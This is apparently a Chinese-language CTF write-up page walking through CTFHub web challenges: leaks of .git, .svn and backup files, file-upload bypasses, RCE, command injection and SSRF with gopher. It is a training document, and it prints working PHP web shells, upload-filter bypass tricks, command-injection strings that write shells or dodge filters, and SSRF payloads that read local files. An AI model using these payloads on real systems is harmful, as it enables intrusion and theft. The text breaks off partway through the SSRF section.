@@ -1,0 +1,799 @@
+<!DOCTYPE html>
+<html lang="zh" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>CTFHub WriteUp - Forlight's Docs</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/color-brewer.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="..">Forlight's Docs</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href=".." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">最近</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../MySQL/" class="dropdown-item">数据库</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">归档</a>
+                                <ul class="dropdown-menu">
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">计算机系统</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../linux/" class="dropdown-item">Linux系统</a>
+</li>
+            
+<li>
+    <a href="../HTTP/" class="dropdown-item">HTTP协议</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">数通网络</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../IGMP/" class="dropdown-item">IGMP</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">网络安全</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../SQL%E6%B3%A8%E5%85%A5/" class="dropdown-item">SQLI</a>
+</li>
+            
+<li>
+    <a href="../XSS%E6%B3%A8%E5%85%A5/" class="dropdown-item">XSS</a>
+</li>
+            
+<li>
+    <a href="../msf%E6%9E%84%E5%BB%BA%E6%9C%A8%E9%A9%AC/" class="dropdown-item">MSF</a>
+</li>
+            
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">CTFHub WriteUp</a>
+</li>
+            
+<li>
+    <a href="../DVWA%20WriteUp/" class="dropdown-item">DVWA WriteUp</a>
+</li>
+    </ul>
+  </li>
+                                    
+  <li class="dropdown-submenu">
+    <a href="#" class="dropdown-item">软件</a>
+    <ul class="dropdown-menu">
+            
+<li>
+    <a href="../VMware%20Pro%E5%AE%89%E8%A3%85/" class="dropdown-item">VMware Pro安装</a>
+</li>
+            
+<li>
+    <a href="../typora%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/" class="dropdown-item">typora安装与破解</a>
+</li>
+    </ul>
+  </li>
+                                </ul>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../about/" class="nav-link">About</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../msf%E6%9E%84%E5%BB%BA%E6%9C%A8%E9%A9%AC/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../DVWA%20WriteUp/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/edit/master/docs/CTFHub WriteUp.md" class="nav-link"><i class="fa-brands fa-github"></i> Edit on GitHub</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#ctfhub-writeupweb" class="nav-link">CTFHub WriteUp(web)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="ctfhub-writeupweb">CTFHub WriteUp(web)</h1>
+<h3 id="_1">信息泄露</h3>
+<hr />
+<h4 id="1">1、目录遍历</h4>
+<p>根据规律构建python脚本</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://challenge-eec3a48df115459e.sandbox.ctfhub.com:10800/flag_in_here/&quot;
+
+for i in range(5):
+
+  for j in range(5):
+
+    url_test = url + &quot;/&quot; + str(i) + &quot;/&quot; + str(j)
+
+    r = requests.get(url_test)
+
+    r.encoding = 'utf-8'
+
+    get_file = r.text
+
+    if &quot;flag.txt&quot; in get_file:
+
+      print(url_test)
+</code></pre>
+<p><img alt="image-20260731132409431" src="../img/image-20260731132409431.png" /></p>
+<p><img alt="image-20260731132429542" src="../img/image-20260731132429542.png" /></p>
+<hr />
+<h4 id="2phpinfo">2、PHPINFO</h4>
+<p>点开phpinfo.php，记录的php信息</p>
+<p>CTRL+F搜索flag</p>
+<p><img alt="image-20260731141633014" src="../img/image-20260731141633014.png" /></p>
+<p><a href="https://www.cnblogs.com/slgkaifa/p/19149463#1、什么是phpinfo？">深入解析：CTFHub 信息泄露通关笔记2：PHPINFO泄露 - slgkaifa - 博客园</a></p>
+<hr />
+<h4 id="3">3、备份文件下载</h4>
+<h5 id="_2">网站源码</h5>
+<p>提示目录和文件后缀，尝试爆破</p>
+<p>bp抓包发到攻击器intruder</p>
+<p>在路径/1.1将两个<code>1</code>设成两个payload变量，攻击模式选择集束炸弹</p>
+<p><img alt="image-20260731154215885" src="../img/image-20260731154215885.png" /></p>
+<p>payloads position1-1列表添加目录</p>
+<p><img alt="image-20260731154345416" src="../img/image-20260731154345416.png" /></p>
+<p>2-1添加上后缀名</p>
+<p><img alt="image-20260731154412810" src="../img/image-20260731154412810.png" /></p>
+<p>开始爆破</p>
+<p><img alt="image-20260731154449817" src="../img/image-20260731154449817.png" /></p>
+<p>得到响应200时的路径<code>/www.zip</code></p>
+<p>访问后下载压缩包，打开文件提示<code>where is flag ??</code></p>
+<p><img alt="image-20260731154541800" src="../img/image-20260731154541800.png" /></p>
+<p>注意到是文本文件，将文件名作为路径访问/flag_420015653.txt</p>
+<p><img alt="image-20260731154729853" src="../img/image-20260731154729853.png" /></p>
+<p>得到flag</p>
+<h5 id="bak">bak文件</h5>
+<p>提示flag在index.php当中</p>
+<p>访问<code>/index.php</code>，还是一样</p>
+<p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载</p>
+<p>访问<code>/index.php.bak</code>，弹出下载</p>
+<p>打开就是flag</p>
+<h5 id="vim">vim缓存</h5>
+<p>参考<a href="https://blog.csdn.net/bailuy/article/details/108502602">CTFHUB 信息泄露题目 备份文件下载(网站源码、bak文件、vim缓存、.DS_Store)_index.php.swp-CSDN博客</a></p>
+<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp</p>
+<p>访问<code>/.index.php.swp</code></p>
+<p>下载文件index.php.swp，将其复制到kali，用vim编辑器打开</p>
+<p><img alt="image-20260731162024993" src="../img/image-20260731162024993.png" /></p>
+<p>按<strong>R</strong>恢复，enter打开得到flag</p>
+<p><img alt="image-20260731162110185" src="../img/image-20260731162110185.png" /></p>
+<h5 id="ds_store">.DS_Store</h5>
+<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
+<p>访问<code>/.DS_Store</code></p>
+<p>下载文件，复制到Linux</p>
+<p>cat查看，有一个txt文件，提示有flag，加到url打开</p>
+<pre><code>/7fc58f94dfb00dc91c5ef3611b2e0c00.txt
+</code></pre>
+<p><img alt="image-20260731162703734" src="../img/image-20260731162703734.png" /></p>
+<hr />
+<h4 id="4git">4、Git泄露</h4>
+<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
+<h5 id="log">Log</h5>
+<p>需要使用BugScanTeam的GitHack</p>
+<p>克隆仓库</p>
+<pre><code>sudo git clone https://github.com/BugScanTeam/GitHack
+</code></pre>
+<p>进入目录，用<strong>python2</strong>执行.py文件</p>
+<pre><code>cd GitHack
+sudo python2 GitHack.py http://www.example.com/.git
+</code></pre>
+<p>GitHack工具可还原 <code>.git</code> 目录中的完整仓库，工具会自动从目标 <code>.git</code> 目录下载文件，还原后的项目存储在 <code>dist/目标域名/</code> 目录中，包含完整源代码和版本历史</p>
+<p><img alt="image-20260731172025628" src="../img/image-20260731172025628.png" /></p>
+<p>还原后进入目录中</p>
+<pre><code>cd dist/challenge-39c106a3b227686b.sandbox.ctfhub.com_10800
+</code></pre>
+<p>再执行<code>git log</code>查看日志记录</p>
+<p><img alt="image-20260731171913452" src="../img/image-20260731171913452.png" /></p>
+<p>注意到有add flag的记录，记下commit</p>
+<p>执行git reset，切换到add flag版本的代码，查看库发现多出来一个文本文件，里面是flag</p>
+<pre><code>sudo git reset --hard f7954a8377ac4a69604af9d572d38a4a8431b110
+</code></pre>
+<p><img alt="image-20260731172549198" src="../img/image-20260731172549198.png" /></p>
+<h5 id="stash">Stash</h5>
+<p>同上一题<code>log</code></p>
+<p>最后</p>
+<p>查看stash暂存记录</p>
+<pre><code>git stash list
+</code></pre>
+<p><img alt="image-20260731174025603" src="../img/image-20260731174025603.png" /></p>
+<p>恢复暂存记录</p>
+<pre><code>sudo git stash pop
+</code></pre>
+<p><img alt="image-20260731174200907" src="../img/image-20260731174200907.png" /></p>
+<p>或者使用<code>git diff</code>版本比较查看add flag版本的变化，有些版本是<code>git log diff</code>，后面接<code>add flag</code>版本的commit，commit用<code>git log</code>查看</p>
+<pre><code>git diff 97c901fa9fb925c5d94279309407e2e34c93841c
+</code></pre>
+<p><img alt="image-20260731174557994" src="../img/image-20260731174557994.png" /></p>
+<h5 id="index">Index</h5>
+<p>同上，clone成功后访问其中的.txt文件</p>
+<hr />
+<h4 id="5svn">5、SVN泄露</h4>
+<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
+<p>需要使用SVN泄露的漏洞利用工具dvcs-ripper，可以直接在ctfhub搜到下载</p>
+<p>https://github.com/kost/dvcs-ripper</p>
+<p>放到kali当中</p>
+<p>切换到工具目录<code>/dvcs-ripper-master</code></p>
+<p>安装依赖</p>
+<pre><code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl
+</code></pre>
+<p>将泄露的文件下载到本地目录中</p>
+<pre><code>./rip-svn.pl -u http://example.com:port/.svn
+</code></pre>
+<p><img alt="image-20260801221419859" src="../img/image-20260801221419859.png" /></p>
+<p>查看所有文件</p>
+<pre><code>ls -al
+</code></pre>
+<p><img alt="image-20260801221432632" src="../img/image-20260801221432632.png" /></p>
+<p>切换到.svn目录，再切到pristine</p>
+<pre><code>cd .svn
+cd pristine
+</code></pre>
+<p>逐个查看里面的文件，或者搜寻ctfhub</p>
+<pre><code>grep -rn &quot;ctfhub&quot;
+</code></pre>
+<p><img alt="image-20260801221445516" src="../img/image-20260801221445516.png" /></p>
+<hr />
+<h4 id="6hg">6、HG泄露</h4>
+<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
+<p>dirsearch扫出<code>.hg</code>目录</p>
+<p>用工具dvcs-ripper将泄露的文件下载到本地目录中</p>
+<pre><code>./rip-hg.pl -u http://example.com:port/.hg
+</code></pre>
+<p><img alt="image-20260802112103691" src="../img/image-20260802112103691.png" /></p>
+<p>显示404报错，用命令<code>tree .hg</code>，列出刚刚下载的网站目录</p>
+<p><img alt="image-20260802112413809" src="../img/image-20260802112413809.png" /></p>
+<p>查看<code>last-message.txt</code>，内容<code>add flag</code>，提示旧版本</p>
+<p>直接查找<code>flag</code></p>
+<pre><code>grep -a -r flag
+</code></pre>
+<p><img alt="image-20260802113806653" src="../img/image-20260802113806653.png" /></p>
+<p>尝试访问<code>/flag_2393610704.txt</code></p>
+<pre><code>curl http://challenge-205d2fc13c467b80.sandbox.ctfhub.com:10800/flag_2393610704.txt
+</code></pre>
+<p><img alt="image-20260802113906626" src="../img/image-20260802113906626.png" /></p>
+<hr />
+<h3 id="_3">文件上传</h3>
+<hr />
+<h4 id="1_1">1、无验证</h4>
+<p>打开是个上传文件的网页</p>
+<p>上传一句话木马用于远程连接，新建一个.php文件，内容如下</p>
+<pre><code>&lt;?php @eval($_POST['123']);?&gt;
+</code></pre>
+<p>再将文件上传</p>
+<p>提示上传成功</p>
+<p><img alt="image-20260802193907333" src="../img/image-20260802193907333.png" /></p>
+<p>提示文件路径<code>upload/123.php</code></p>
+<p><img alt="image-20260802194002005" src="../img/image-20260802194002005.png" /></p>
+<p>打开蚁剑连接</p>
+<pre><code>http://challenge-a2c63090c713408d.sandbox.ctfhub.com:10800/upload/123.php
+</code></pre>
+<p>密码就是木马里设置的<code>123</code></p>
+<p><img alt="image-20260802194051733" src="../img/image-20260802194051733.png" /></p>
+<p>测试成功后添加，双击打开</p>
+<p>可以访问服务器文件，逐级往上翻找</p>
+<p><img alt="image-20260802194515824" src="../img/image-20260802194515824.png" /></p>
+<hr />
+<h4 id="2">2、前端验证</h4>
+<p>上传.php格式木马时提示不允许</p>
+<p><img alt="image-20260802195151191" src="../img/image-20260802195151191.png" /></p>
+<p>右键-&gt;检查-&gt;源代码，找到JavaScript部分</p>
+<p><img alt="image-20260802195450136" src="../img/image-20260802195450136.png" /></p>
+<p>前端校验只允许<code>".jpg",".png",".gif"</code>格式文件上传</p>
+<p>将木马后缀修改成允许的后缀再上传，提示上传成功</p>
+<p>但是图像文件会让靶机无法读取php代码，所以需要bp改包</p>
+<p>用burp suite抓包发到重放器repeater</p>
+<p>将头部Content-Disposition字段的filename改成123.php</p>
+<p><img alt="image-20260802200547036" src="../img/image-20260802200547036.png" /></p>
+<p>再发送，返回上传成功</p>
+<p>打开蚁剑，地址栏还是填<code>upload/123.php</code></p>
+<p><img alt="image-20260802200346078" src="../img/image-20260802200346078.png" /></p>
+<hr />
+<h4 id="3htaccess">3、.htaccess</h4>
+<p>.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的</p>
+<p>.htaccess可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档、文件的跳转等功能。</p>
+<p>访问靶机，尝试上传.php一句话木马，提示文件类型不匹配</p>
+<p><img alt="image-20260802201055070" src="../img/image-20260802201055070.png" /></p>
+<p>查看源码，提示我们后端校验禁止上传php格式，尝试htaccess改配置</p>
+<p><img alt="image-20260802210114515" src="../img/image-20260802210114515.png" /></p>
+<p>创建一个文本，写入</p>
+<pre><code>AddType application/x-httpd-php .png
+</code></pre>
+<p>重命文件名为<code>.htaccess</code>，将其上传</p>
+<p>成功后就可以上传.png后缀的一句话木马文件，而且将<code>.png</code>文件当作php代码执行，意味着可以运行一句话木马</p>
+<p>然后蚁剑连接</p>
+<hr />
+<h4 id="4mime">4、MIME绕过</h4>
+<p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
+<p>直接上传<code>.php</code>后缀的一句话木马，提示文件类型不对</p>
+<p>bp抓包，将请求体中的<strong>Content-Type</strong>字段改成</p>
+<pre><code>image/png
+</code></pre>
+<p><img alt="image-20260802211739172" src="../img/image-20260802211739172.png" /></p>
+<p>提示上传成功，路径upload/123.php</p>
+<p>再用蚁剑连接即可</p>
+<hr />
+<h4 id="500">5、00截断</h4>
+<p>%00，0x00，/00都属于00截断，利用的是服务器的解析漏洞（ascii中0表示字符串结束），所以读取字符串到00就会停止，认为已经结束。</p>
+<p>使用%00截断有两个条件</p>
+<p>php版本小于5.3.4
+magic_quotes_gpc为off状态</p>
+<p>直接传<code>.php</code>木马提示文件类型不匹配，查看源码</p>
+<p><img alt="image-20260802214709785" src="../img/image-20260802214709785.png" /></p>
+<p>提示白名单"jpg", "png", "gif"格式可以上传</p>
+<p>将木马文件后缀改成<code>.php.jpg</code></p>
+<p>上传pb抓包</p>
+<p>在header路径使用00截断</p>
+<p><img alt="image-20260802214314264" src="../img/image-20260802214314264.png" /></p>
+<p>加上123.php%00</p>
+<p><img alt="image-20260802214402859" src="../img/image-20260802214402859.png" /></p>
+<p>发送，返回上传成功</p>
+<p>蚁剑连接</p>
+<hr />
+<h4 id="6">6、双写后缀</h4>
+<p>直接上传.php木马，提示上传成功，但路径显示文件没有后缀</p>
+<p><img alt="image-20260802215143620" src="../img/image-20260802215143620.png" /></p>
+<p>查看网页源码，提示网站黑名单，包括<code>.php</code>，<code>.htaccess</code>后缀，上传后会将后缀中的敏感字删除</p>
+<p>bp改包，将文件名改成123.pphphp</p>
+<p><img alt="image-20260802215758376" src="../img/image-20260802215758376.png" /></p>
+<p>蚁剑连接123.php</p>
+<hr />
+<h4 id="7">7、文件头检查</h4>
+<p>直接传<code>.php</code>木马提示只允许上传 jpeg jpg png gif 类型的文件</p>
+<p><img alt="image-20260802222308764" src="../img/image-20260802222308764.png" /></p>
+<p>添加<code>GIF89a</code>到木马文件头部</p>
+<p><img alt="image-20260802222741583" src="../img/image-20260802222741583.png" /></p>
+<p>如果不添加gif文件头，直接上传，提示文件错误</p>
+<p><img alt="image-20260802223640653" src="../img/image-20260802223640653.png" /></p>
+<p>方法一(MIME)</p>
+<p>上传<code>123.php</code>，bp改包将<strong>Content-Type</strong>改成<code>image/gif</code>，发送，成功，连接蚁剑</p>
+<p><img alt="image-20260802223205495" src="../img/image-20260802223205495.png" /></p>
+<p>方法二</p>
+<p>上传<code>.gif</code>文件，再改包将<strong>filename</strong>的后缀改成<code>.php</code></p>
+<p><img alt="image-20260802223819105" src="../img/image-20260802223819105.png" /></p>
+<hr />
+<h3 id="rce">RCE</h3>
+<hr />
+<h4 id="1eval">1、eval执行</h4>
+<p>打开靶场，eval()函数将传入的cmd参数当作php代码执行</p>
+<p><img alt="image-20260723120055420" src="../img/image-20260723120055420.png" /></p>
+<p>这里直接提示可通过参数cmd传入php代码，打开cmd</p>
+<pre><code>curl &quot;http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('ls+/');&quot;
+</code></pre>
+<p><img alt="image-20260723120257551" src="../img/image-20260723120257551.png" /></p>
+<p>url中+代替空格，<code>ls /</code>查看根目录，发现目录flag_30687，cat查看</p>
+<pre><code>curl &quot;http://challenge-0a8ae9745c8d5abd.sandbox.ctfhub.com:10800/?cmd=system('cat+/flag_30687');&quot;
+</code></pre>
+<p><img alt="image-20260723120743960" src="../img/image-20260723120743960.png" /></p>
+<p>找到flag</p>
+<p>也可以传入一句话木马，用webshell连接</p>
+<pre><code>cmd= fputs(fopen('shell.php','w'),'&lt;?php @eval(_POST\[123\]);?\&gt;');
+</code></pre>
+<hr />
+<h4 id="2_1">2、文件包含</h4>
+<p>打开提示file传参</p>
+<p><img alt="image-20260728204356971" src="../img/image-20260728204356971.png" /></p>
+<p>shell.txt内容是一句话木马</p>
+<p><img alt="image-20260728204143987" src="../img/image-20260728204143987.png" /></p>
+<p>构造url</p>
+<pre><code>/?file=shell.txt
+</code></pre>
+<p><img alt="image-20260728204226339" src="../img/image-20260728204226339.png" /></p>
+<p>用蚁剑连接</p>
+<p><img alt="image-20260728204059960" src="../img/image-20260728204059960.png" /></p>
+<p>找到flag</p>
+<p><img alt="image-20260728204426633" src="../img/image-20260728204426633.png" /></p>
+<hr />
+<h4 id="3phpinput">3、php://input</h4>
+<p>提示php://伪协议</p>
+<p><img alt="image-20260728211044283" src="../img/image-20260728211044283.png" /></p>
+<p>打开phpinfo，允许文件包含，可以执行远程代码</p>
+<p><img alt="image-20260728211111992" src="../img/image-20260728211111992.png" /></p>
+<p>bp抓包改包</p>
+<p>头部改成post请求，使用php://input伪协议</p>
+<pre><code>POST /?file=php://input HTTP/1.1
+</code></pre>
+<p>请求体中创建shell.php，写入一句话木马</p>
+<pre><code>&lt;?php file_put_contents('shell.php', '&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;');?&gt;
+</code></pre>
+<p>蚁剑连接<code>/shell.php</code></p>
+<p>找到flag</p>
+<hr />
+<h4 id="4">4、远程包含</h4>
+<p>可以同3、php://input</p>
+<p>如果有自己的服务器，可以传递服务器上的木马文件，再用蚁剑远程连接</p>
+<hr />
+<h4 id="5">5、读取源代码</h4>
+<pre><code>?file=php://filter/resource=/flag
+</code></pre>
+<p><img alt="image-20260728223734129" src="../img/image-20260728223734129.png" /></p>
+<h5 id="php">php://伪协议</h5>
+<p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">PHP伪协议深度解析：绕过限制与安全风险-CSDN博客</a></p>
+<hr />
+<h4 id="6ctfhub">6、CTFHub 命令注入</h4>
+<p>提示无过滤</p>
+<p>构造payload，写入一句话木马</p>
+<pre><code>127.0.0.1 &amp;echo &quot;&lt;?php @eval(\$_POST['123']);?&gt;&quot; &gt;&gt; shell.php
+</code></pre>
+<p>蚁剑连接</p>
+<p>or</p>
+<pre><code>127.0.0.1 | ls
+127.0.0.1 | cat 
+</code></pre>
+<p>浏览器将内容当html处理了，查看页面源码就能看到</p>
+<p><img alt="image-20260728223049644" src="../img/image-20260728223049644.png" /></p>
+<hr />
+<h4 id="7cat">7、过滤cat</h4>
+<pre><code>127.0.0.1 | ls
+127.0.0.1 | more flag_30958210968888.php
+查看页面源码即可
+</code></pre>
+<p>less、head、tac都可以</p>
+<hr />
+<h4 id="8">8、过滤空格</h4>
+<pre><code>127.0.0.1|ls
+127.0.0.1|cat$IFS$1flag_12802294047863.php
+查看页面源码即可
+</code></pre>
+<p>代替空格</p>
+<pre><code>${IFS}
+$IFS$1
+&lt; 
+</code></pre>
+<h5 id="_4">更多：<a href="https://blog.csdn.net/weixin_39190897/article/details/116247765">绕过空格过滤</a></h5>
+<hr />
+<h4 id="9">9、过滤目录分隔符</h4>
+<p>利用';'拼接命令绕过</p>
+<pre><code>127.0.0.1 | ls
+127.0.0.1 ; cd flag_is_here ; ls
+127.0.0.1 ; cd flag_is_here ; cat flag_5422868316779.php
+查看页面源码即可
+</code></pre>
+<hr />
+<h4 id="10">10、过滤运算符</h4>
+<p>没有过滤<code>;</code></p>
+<pre><code>127.0.0.1 ; ls
+127.0.0.1 ; cat flag_1986153693728.php
+查看页面源码即可
+</code></pre>
+<p>也可使用换行符<code>%0a</code>，替换到url中</p>
+<pre><code>?ip=127.0.0.1%0als
+</code></pre>
+<hr />
+<h4 id="11">11、综合过滤练习</h4>
+<p><code>%0a</code>换行符分隔命令</p>
+<p><code>$IFS$1</code>替代空格</p>
+<p><code>fl*</code>模糊匹配<strong>flag</strong></p>
+<p>替换url</p>
+<pre><code>?ip=127.0.0.1%0als
+?ip=127.0.0.1%0acd$IFS$1fl*%0als
+?ip=127.0.0.1%0acd$IFS$1fl*%0atac$IFS$1fl*
+</code></pre>
+<h5 id="bypass_">参考博客<a href="https://blog.csdn.net/qq_41315957/article/details/118855865">绕过bypass_远程命令执行绕过</a></h5>
+<hr />
+<h3 id="ssrf">SSRF</h3>
+<hr />
+<h4 id="1_2">1、内网访问</h4>
+<p>题目提示：尝试访问位于127.0.0.1的flag.php</p>
+<p>url栏已有参数</p>
+<pre><code>?url=_
+</code></pre>
+<p>构造payload</p>
+<pre><code>?url=127.0.0.1/flag.php
+</code></pre>
+<p><img alt="image-20260729154454401" src="../img/image-20260729154454401.png" /></p>
+<hr />
+<h4 id="2_2">2、伪协议读取文件</h4>
+<p>提示web目录，一般web服务路径就是/var/www/html/</p>
+<pre><code>?url=file:///var/www/html/flag.php
+</code></pre>
+<p><img alt="image-20260729155638334" src="../img/image-20260729155638334.png" /></p>
+<p>查看页面源码即可</p>
+<hr />
+<h4 id="3_1">3、端口扫描</h4>
+<p>提示扫8000到9000的端口，那就用bp爆破</p>
+<p>dict协议和http协议都可以用来探测端口存活</p>
+<pre><code>?url=dict://127.0.0.1:8000
+?url=http://127.0.0.1:8000
+</code></pre>
+<p>抓包发到攻击器，添加端口部分为payload，选择数字，8000到9000</p>
+<p>爆破完筛选响应长度</p>
+<p><img alt="image-20260729162735307" src="../img/image-20260729162735307.png" /></p>
+<hr />
+<h4 id="4post">4、POST请求</h4>
+<p>dirsearch扫描目录得到两个文件<code>/flag.php</code>，<code>/index.php</code></p>
+<p>查看<code>/flag.php</code></p>
+<pre><code>?url=file:///var/www/html/flag.php
+</code></pre>
+<p>打开是空白，查看源码</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+
+if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) {
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+}
+
+$flag=getenv(&quot;CTFHUB&quot;);
+$key = md5($flag);
+
+if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) {
+    echo $flag;
+    exit;
+}
+?&gt;
+
+&lt;form action=&quot;/flag.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;text&quot; name=&quot;key&quot;&gt;
+&lt;!-- Debug: key=&lt;?php echo $key;?&gt;--&gt;
+&lt;/form&gt;
+</code></pre>
+<p>提示访问<code>127.0.0.1/flag.php</code></p>
+<p><img alt="image-20260729220643653" src="../img/image-20260729220643653.png" /></p>
+<pre><code>key=b40bb514b81c81d8f238ba14fbd0cff5
+</code></pre>
+<p>到这先放着，看另一个文件</p>
+<pre><code>?url=file:///var/www/html/index.php
+</code></pre>
+<pre><code>&lt;?php
+
+error_reporting(0);
+
+if (!isset($_REQUEST['url'])){
+    header(&quot;Location: /?url=_&quot;);
+    exit;
+}
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_exec($ch);
+curl_close($ch);
+</code></pre>
+<p>代码直接将用户输入的 <code>url</code> 参数传给 cURL，攻击者可以让服务器访问任意地址</p>
+<p>需要使用gopher协议使服务器发出请求</p>
+<p>构造POST请求的HTTP数据包</p>
+<pre><code>POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=b40bb514b81c81d8f238ba14fbd0cff5
+</code></pre>
+<p>然后对其进行url编码，但有几点因为gopher协议本身规定</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p>问号（？）需要转码为URL编码，也就是<code>%3f</code></p>
+<p>回车换行要变为<code>%0d%0a</code>，但如果直接用工具转，可能只会有<code>%0a</code></p>
+<p>在HTTP包的最后也要加<code>%0d%0a</code>，代表消息结束（具体可研究HTTP包结束）</p>
+</blockquote>
+<h5 id="gopher">gopher协议大佬详解</h5>
+<p><a href="https://ayuniversity.github.io/2025/04/16/Gopher协议在SSRF漏洞中的深入研究/">Gopher协议在SSRF漏洞中的深入研究 | 青云阁</a></p>
+<p>第一次编码，将post请求包构造成 gopher 链接</p>
+<pre><code>POST%20/flag.php%20HTTP/1.1%0d%0AHost:%20127.0.0.1:80%0d%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2036%0d%0A%0d%0Akey=b40bb514b81c81d8f238ba14fbd0cff5%0d%0a
+</code></pre>
+<p>前面加上<code>gopher://127.0.0.1:80/_</code></p>
+<p>第二次编码，这个 gopher 链接是放在 <code>?url=</code> 参数里的，它本身也是一个 URL</p>
